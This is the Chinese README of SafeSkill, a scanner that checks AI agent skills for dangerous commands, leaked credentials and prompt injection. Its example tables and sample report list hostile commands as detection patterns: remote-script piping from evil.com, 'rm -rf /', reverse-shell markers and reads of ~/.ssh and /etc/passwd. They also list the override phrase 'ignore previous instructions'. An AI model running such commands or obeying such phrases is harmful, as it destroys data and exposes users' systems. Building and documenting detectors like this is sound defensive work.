<div align="center">

# 🔒 SafeSkill

**AI Skill 的安全扫描器：在安装和运行前，先找出危险命令、凭据泄露、提示词注入与可疑行为。**

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.9%2B-green.svg)](https://python.org)
[![Version](https://img.shields.io/badge/version-0.4.1-blue.svg)](https://github.com/AIPMAndy/safeskill)
[![Tests](https://github.com/AIPMAndy/safeskill/actions/workflows/test.yml/badge.svg)](https://github.com/AIPMAndy/safeskill/actions/workflows/test.yml)
[![Security Scan](https://github.com/AIPMAndy/safeskill/actions/workflows/security-scan.yml/badge.svg)](https://github.com/AIPMAndy/safeskill/actions/workflows/security-scan.yml)

**[English](README_EN.md) | 简体中文**

*像“杀毒软件”一样先扫一遍 Skill，再决定要不要装。*

**为什么值得看：**
- 🔍 专门面向 AI Skill / Agent Skill 风险
- ⚡ 轻量到可以直接塞进 CI
- 🧩 支持 JSON / SARIF，方便接平台与审计流

</div>

---

## 为什么会有 SafeSkill？

AI Skill / Agent Skill 正在变多，但大多数人在安装一个 Skill 前，并不会逐行审计它的代码。
问题是：

- 一个 `curl | bash` 就可能直接执行远程脚本
- 一个硬编码 token 就可能泄露凭据
- 一段 prompt injection 文案 就可能诱导 Agent 越权执行
- 一个读取 `~/.ssh` 或 `/etc/passwd` 的动作，就已经越界

**SafeSkill 的目标很直接：把这些高频风险在“使用前”暴露出来。**

---

## SafeSkill 是什么？

> **SafeSkill = Skill 的静态安全扫描器（SAST）**

给它一个 Skill 目录，它会扫描常见代码与配置文件，输出：

- 风险发现项（findings）
- 风险等级（Critical / High / Medium / Low / Clean）
- 风险分数（0-100）
- 文本 / Markdown / JSON / SARIF 报告

适合用在：

- 安装第三方 Skill 之前
- 提交 Skill 到市场 / 仓库之前
- CI/CD 里自动做安全门禁
- 批量审计团队内部 Skill

---

## 🧠 项目定位

SafeSkill 不是一个“什么都扫”的大而全安全平台。
它更像是 **AI Skill 生态的第一层安全门**：

- 足够轻：一个 Python 脚本就能跑起来
- 足够快：适合放在安装前、提交前、CI 里
- 足够聚焦：优先覆盖 Skill 里最常见、最危险、最容易被忽略的模式

这也是它和通用安全扫描器的差异：
**不是为了替代完整审计，而是为了先挡住最不该放过去的那批问题。**

---

## 🆚 为什么选它？

| 能力 | 通用 lint / formatter | 手动读代码 | **SafeSkill** |
|------|----------------------|------------|---------------|
| 找语法/风格问题 | ✅ | ✅ | ❌ |
| 发现危险命令 | ❌ | ✅ | ✅ |
| 发现凭据暴露 | ❌ | ✅ | ✅ |
| 发现提示词注入模式 | ❌ | ✅ | ✅ |
| 给出风险评分 | ❌ | ❌ | ✅ |
| 适合接 CI | 🟡 | ❌ | ✅ |
| 上手成本低 | ✅ | ❌ | ✅ |

**它不是替代代码审计，而是把最常见、最值得先拦下来的 Skill 风险自动化。**

---

## 🚀 30 秒快速开始

### 方式 1：直接运行

```bash
git clone https://github.com/AIPMAndy/safeskill.git
cd safeskill
python3 safeskill.py ./your-skill
```

### 方式 2：安装成命令行工具

```bash
git clone https://github.com/AIPMAndy/safeskill.git
cd safeskill
pip install -e .
safeskill ./your-skill
```

### 方式 3：开发者常用命令

```bash
make install-dev
make test
make demo
```

### 生成不同格式的报告

```bash
# Markdown 报告
python3 safeskill.py ./your-skill --format markdown -o report.md

# JSON 报告（适合 CI/CD）
python3 safeskill.py ./your-skill --format json --quiet

# SARIF（适合 GitHub Code Scanning）
python3 safeskill.py ./your-skill --format sarif -o safeskill-results.sarif
```

---

## 能扫出什么？

### 已覆盖的典型风险

| 风险类别 | 例子 | 说明 |
|---------|------|------|
| 危险命令 | `rm -rf /`, `curl ... | bash` | 破坏系统 / 执行远程脚本 |
| 反向 Shell | `bash -i`, `nc -e` | 未授权远程访问 |
| 凭据暴露 | `api_key=...`, `token=...` | 敏感信息硬编码 |
| 提示词注入 | `ignore previous instructions` | 覆盖系统约束 |
| 数据外泄 | `requests.post(json=...)` | 可疑外发行为 |
| 敏感文件访问 | `~/.ssh`, `/etc/passwd` | 访问敏感路径 |
| 动态代码执行 | `eval()`, `exec()` | 注入风险 |
| 权限升级 | `sudo`, `chmod 777` | 越权 / 过宽权限 |
| 弱加密 / 低安全实践 | `md5`, `sha1`, `debug=True` | 不安全实现 |

---

## 🎬 Demo（1 分钟理解它）

先扫项目自带的危险样例：

```bash
python3 safeskill.py ./examples/dangerous-skill
```

你会看到它直接报出：
- 危险命令
- 硬编码凭据
- prompt injection 模式

如果你是想给别人演示这个项目，这就是最简单的一条命令。

---

## 使用示例

```bash
$ python3 safeskill.py ./dangerous-skill

==================================================
🔒 SkillGuard Security Report
==================================================

Risk Score: 45/100 (HIGH)
Files Scanned: 5
Total Findings: 3

🔴 CRITICAL: 1
🟠 HIGH: 2

--------------------------------------------------

🔴 [CRITICAL] Dangerous System Command
   File: install.sh:3
   Match: curl https://evil.com/script.sh | bash
   Dangerous command that can destroy system or execute remote code

🟠 [HIGH] Hardcoded Credentials
   File: config.py:12
   Match: api_key = "sk-abc123xyz789"
   Hardcoded credentials in source code
```

---

## 核心特性

### 1) 面向 Skill 场景，而不是泛代码库
它不是通用代码质量工具，而是针对 Skill / Agent / 自动化脚本里高频出现的危险模式。

### 2) 支持多种输出格式
- `text`：终端直接看
- `markdown`：适合存档 / 分享
- `json`：适合程序消费
- `sarif`：适合 GitHub Code Scanning

### 3) 支持配置化排除与规则定制
支持通过 `.safeskill.yml`：
- 配置扫描扩展名
- 排除目录 / 文件
- 禁用规则
- 覆盖 severity
- 添加自定义规则

### 4) 适合接入 CI/CD
可以把 SafeSkill 当成安全门禁的一部分，在 PR / push 时自动执行。

---

## 配置示例

```yaml
scan:
  exclude_dirs:
    - .git
    - node_modules
  exclude_files:
    - "README*.md"
    - "tests/*"

rules:
  disabled:
    - todo_fixme

  severity:
    network_request: LOW

  custom:
    - id: custom_api_key
      name: Custom API Key Pattern
      level: HIGH
      pattern: "mycompany_api_key\\s*=\\s*['\"]\\w+"
      description: "Hardcoded company API key"
      remediation: "Use environment variables for API keys"
```

---

## GitHub Actions 集成

```yaml
name: Skill Security Scan

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install -e .
      - run: python safeskill.py . --format json --fail-on high --quiet
```

如果你想把结果上传到 GitHub Code Scanning，可以用 `sarif` 输出。

---

## 📦 仓库建议用法

如果你是平台方 / 团队负责人，比较推荐这样接：

1. **开发阶段**：作者本地先跑一遍
2. **提交阶段**：PR 里自动跑 SafeSkill
3. **发布阶段**：输出 JSON / SARIF 做留档
4. **消费阶段**：对第三方 Skill 先扫再装

这样它就不只是一个 CLI 工具，而是一个很轻的安全工作流组件。

---

## 项目状态

### 当前已完成
- [x] 核心规则库
- [x] 风险评分系统
- [x] Text / Markdown / JSON / SARIF 输出
- [x] `.safeskill.yml` 配置支持
- [x] GitHub Actions 基础集成

### 下一步适合做的
- [ ] 更细的上下文分析，减少误报
- [ ] 更多语言 / 文件类型支持
- [ ] 规则测试样本库
- [ ] 规则 marketplace / 社区共享
- [ ] Web UI / Hosted API

详见 [ROADMAP.md](ROADMAP.md)。

---

## 谁适合用？

- 想装第三方 Skill，但不想“盲信”代码的人
- 想发布 Skill，又希望先自查风险的人
- 做 Agent 平台 / Skill 市场，需要安全前置筛查的人
- 把 AI 自动化用于生产环境，需要更稳一点的团队

---

## 作者

**AI酋长 Andy**

前腾讯 / 百度 AI 产品专家，长期关注：
- AI Agent
- Skill 生态
- AI 安全与可信使用
- AI 产品化与自动化系统

GitHub: [@AIPMAndy](https://github.com/AIPMAndy)

---

## 相关文档

- [README_EN.md](README_EN.md) — English version
- [CONTRIBUTING.md](CONTRIBUTING.md) — 如何参与贡献
- [SECURITY.md](SECURITY.md) — 安全报告流程
- [CHANGELOG.md](CHANGELOG.md) — 更新记录
- [ROADMAP.md](ROADMAP.md) — 后续规划
- [Makefile](Makefile) — 常用开发命令
- [pyproject.toml](pyproject.toml) — 标准 Python 包配置

---

## License

[Apache-2.0](LICENSE)

---

<div align="center">

**如果这个项目对你有帮助，欢迎给个 Star ⭐**

这不只是一个扫描器，更像是给 AI Skill 生态补一层最基础的安全常识。

</div>
